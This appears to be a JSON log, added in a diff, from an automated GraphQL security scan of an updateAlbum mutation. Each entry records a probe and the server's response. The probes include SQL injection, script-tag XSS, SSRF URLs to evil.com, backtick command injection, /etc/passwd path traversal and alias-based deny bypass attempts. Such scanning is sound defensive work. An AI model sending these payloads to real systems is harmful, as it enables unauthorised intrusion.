@@ -1,0 +1,700 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_123\", input: {title: \"New Album Title\", artistId: \"artist_456\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.389,
+    "timestamp": "2025-09-23T18:44:56.745590Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"artistId\" is not defined by type \"UpdateAlbumInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 66
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_123\", input: {title: \"New Album Title' OR 1=1 --\", artistId: \"artist_456\"}) {\n    id\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.38,
+    "timestamp": "2025-09-23T18:44:59.265910Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"artistId\" is not defined by type \"UpdateAlbumInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 77
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_123\", input: {title: \"<script>alert('XSS')</script>\", artistId: \"artist_456\"}) {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.381,
+    "timestamp": "2025-09-23T18:45:02.642359Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"artistId\" is not defined by type \"UpdateAlbumInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 80
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_123\", input: {coverImageUrl: \"https://evil.com/ssrf_callback?data=\"}) {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.191,
+    "timestamp": "2025-09-23T18:45:04.468273Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"coverImageUrl\" is not defined by type \"UpdateAlbumInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_123\", input: {description: \"; ping -c 4 127.0.0.1;\"}) {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.359,
+    "timestamp": "2025-09-23T18:45:07.225123Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"description\" is not defined by type \"UpdateAlbumInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_123\", input: {coverImageUrl: \"../../../etc/passwd\"}) {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.202,
+    "timestamp": "2025-09-23T18:45:09.134236Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"coverImageUrl\" is not defined by type \"UpdateAlbumInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_123\", input: {description: \"<h1>Injected HTML</h1><p>Another paragraph.</p>\", title: \"Album with HTML\"}) {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.39,
+    "timestamp": "2025-09-23T18:45:12.026014Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"description\" is not defined by type \"UpdateAlbumInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_123\", input: {title: \"Normal Update\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.4,
+        "timestamp": "2025-09-23T18:45:14.771413Z",
+        "response_body": {
+          "data": {
+            "updateAlbum": {
+              "id": null,
+              "title": "Normal Update"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.406,
+        "timestamp": "2025-09-23T18:45:15.177033Z",
+        "response_body": {
+          "data": {
+            "updateAlbumAlias": {
+              "id": null,
+              "title": "Aliased Update"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-09-23T18:45:15.177061Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.382,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbumAlias: updateAlbum(id: \"album_123\", input: {title: \"Aliased Update\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.234,
+        "timestamp": "2025-09-23T18:45:18.300055Z",
+        "response_body": {
+          "data": {
+            "updateAlbum": {
+              "id": null,
+              "title": "Normal Update"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.397,
+        "timestamp": "2025-09-23T18:45:18.697781Z",
+        "response_body": {
+          "data": {
+            "updateAlbumAlias": {
+              "id": null,
+              "title": "Aliased Update"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-09-23T18:45:18.697837Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.21,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updateAlbum {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.236,
+    "timestamp": "2025-09-23T18:45:21.277213Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updateAlbum\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updateAlbum(name: \"UpdateAlbumInput\") {\n    fields {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.356,
+    "timestamp": "2025-09-23T18:45:23.440628Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updateAlbum\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_1\", input: {title: \"Updated Album Title\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.39,
+    "timestamp": "2025-09-23T18:45:41.864402Z",
+    "count": 12,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "updateAlbum": {
+          "id": null,
+          "title": "Updated Album Title"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_2\", input: {title: \"Album Title' OR 1=1; --\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.37,
+    "timestamp": "2025-09-23T18:45:44.611108Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "updateAlbum": {
+          "id": null,
+          "title": "Album Title' OR 1=1; --"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_3\", input: {title: \"<script>alert('XSS vulnerability!')</script>\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.403,
+    "timestamp": "2025-09-23T18:45:46.713052Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "updateAlbum": {
+          "id": null,
+          "title": "<script>alert('XSS vulnerability!')</script>"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_4\", input: {title: \"http://evil.com/ssrf_callback?data=\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.223,
+    "timestamp": "2025-09-23T18:45:49.726567Z",
+    "count": 15,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "updateAlbum": {
+          "id": null,
+          "title": "http://evil.com/ssrf_callback?data="
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_5\", input: {title: \"Album Title; `ping -c 4 127.0.0.1`;\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.208,
+    "timestamp": "2025-09-23T18:45:52.242350Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "updateAlbum": {
+          "id": null,
+          "title": "Album Title; `ping -c 4 127.0.0.1`;"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_6\", input: {title: \"../../../etc/passwd\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.393,
+    "timestamp": "2025-09-23T18:45:55.436163Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "updateAlbum": {
+          "id": null,
+          "title": "../../../etc/passwd"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_7\", input: {title: \"<h1>Injected HTML Header</h1><p>This is a paragraph.</p>\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.23,
+    "timestamp": "2025-09-23T18:45:58.517787Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "updateAlbum": {
+          "id": null,
+          "title": "<h1>Injected HTML Header</h1><p>This is a paragraph.</p>"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateAlbum(id: \"album_8\", input: {title: \"Bypass Attempt Non-Aliased\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.403,
+        "timestamp": "2025-09-23T18:46:01.426119Z",
+        "response_body": {
+          "data": {
+            "updateAlbum": {
+              "id": null,
+              "title": "Bypass Attempt Non-Aliased"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.387,
+        "timestamp": "2025-09-23T18:46:01.812830Z",
+        "response_body": {
+          "data": {
+            "aliasedUpdateAlbum": {
+              "id": null,
+              "title": "Bypass Attempt Aliased"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-09-23T18:46:01.812858Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.391,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation UpdateAlbumOperation {\n  aliasedUpdateAlbum: updateAlbum(id: \"album_9\", input: {title: \"Bypass Attempt Aliased\"}) {\n    id\n    title\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.37,
+        "timestamp": "2025-09-23T18:46:04.738133Z",
+        "response_body": {
+          "data": {
+            "updateAlbum": {
+              "id": null,
+              "title": "Bypass Attempt Non-Aliased"
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.206,
+        "timestamp": "2025-09-23T18:46:04.945012Z",
+        "response_body": {
+          "data": {
+            "aliasedUpdateAlbum": {
+              "id": null,
+              "title": "Bypass Attempt Aliased"
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-09-23T18:46:04.945050Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.19,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updateAlbum {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.239,
+    "timestamp": "2025-09-23T18:46:07.929941Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updateAlbum\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updateAlbum(name: \"Album\") {\n    fields {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.203,
+    "timestamp": "2025-09-23T18:46:10.056786Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updateAlbum\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
